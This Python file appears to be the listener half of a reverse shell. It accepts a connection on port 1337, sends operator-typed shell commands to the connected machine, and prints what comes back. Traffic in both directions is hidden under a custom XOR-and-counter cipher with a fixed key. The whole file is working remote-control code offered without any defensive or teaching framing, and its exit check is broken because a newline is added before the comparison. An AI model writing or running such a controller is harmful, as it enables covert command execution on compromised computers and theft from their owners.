from threading import Thread
import socket
from time import sleep
import sys

# Convert array of string to array of array ascii num
def prep_array_ascii(block_list):
    ascii_code_array = []
    for block in block_list:
        ascii_code_array.append(string_to_ascii(block))
    return ascii_code_array

# Convert array of string to array of array ascii num
def int_lists_to_bytes(block_list):
    byte_string = b""
    for block in block_list:
        byte_string += int_list_to_bytes(block)
    return byte_string

# Convert string to list of ascii num
def string_to_ascii(s):
    ascii_code = []
    for char in s:
        ascii_code.append(ord(char))
    return ascii_code

# bytes to list of int
def bytes_to_int_list(b_s):
    int_bytes = []
    for byte in b_s:
        int_bytes.append(int(byte))
    return int_bytes

def int_list_to_bytes(i_l):
    byte_string = b""
    for int_val in i_l:
        try:
            byte_string += int_val.to_bytes(1, 'big')
        except Exception:
            print(int_val, end="")
    return byte_string

# Convert list of ascii num to string
def ascii_to_string(arr):
    s = ""
    for block in arr:
        s += "".join([chr(c) for c in block])
    return s

# Encode and decode list of list of int
def cipher(blocks, IV, action, counter=1):
    IV = string_to_ascii(IV)
    for byte_list_index in range(len(blocks)):
        for byte_index in range(len(blocks[byte_list_index])):
            if action == 'd':
                blocks[byte_list_index][byte_index] = blocks[byte_list_index][byte_index] ^ IV[byte_index]
                blocks[byte_list_index][byte_index] -= counter
            else:
                blocks[byte_list_index][byte_index] += counter
                blocks[byte_list_index][byte_index] = blocks[byte_list_index][byte_index] ^ IV[byte_index]
        if counter + 1 <= 129:
            counter += 1
        else:
            counter = 1

    return counter

#  Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = '127.0.0.1'  # the server doesn't need to know the ip, only the client
        port = 1337
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error', str(msg))


# Bind socket to port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global s
		print('Binding socket to port: ' + str(port))
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
			
		print('Socket binding error', str(msg) + '\n' + 'Retrying...')
		sleep(5)
		socket_bind()


# Establish a connection with client (socket must be listening for them)
def socket_accept():
	conn, address = s.accept()
	print('Connection has been established | ' + 'IP ' + address[0] + ' | Port ' + str(address[1]))
	x = Thread(target=recv_command_res, args=(conn,), daemon=True)
	x.start()
	send_commands(conn)
	conn.close()

# Receives commands 
def recv_command_res(conn):
    counter = 1
    while True:
        client_response = conn.recv(8)
        client_response = [bytes_to_int_list(client_response)]
        counter = cipher(client_response, 'PBMDMMH3', 'd', counter)
        try:
            print(str(int_lists_to_bytes(client_response), 'utf-8'), end='')
        except Exception:
            print(int_lists_to_bytes(client_response), end='')


#  Send commands
def send_commands(conn):
    counter = 1
    while True:
        cmd = input('')
        cmd += '\n'
        if cmd == 'exit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 1:  # system commands are bytes and not strings
            cmd = cmd.encode()
            i = 1
            cmd_list = []
            tmp_cmd = []
            for char in cmd:
                tmp_cmd.append(char)
                if i % 8 == 0:
                    cmd_list.append(tmp_cmd)
                    tmp_cmd = []
                i += 1
            if len(tmp_cmd) != 0:
                cmd_list.append(tmp_cmd)
            print(counter)
            counter = cipher(cmd_list, 'PBMDMMH3', 'e', counter)
            conn.send(int_lists_to_bytes(cmd_list))
            


def main():
    socket_create()
    socket_bind()
    socket_accept()

main()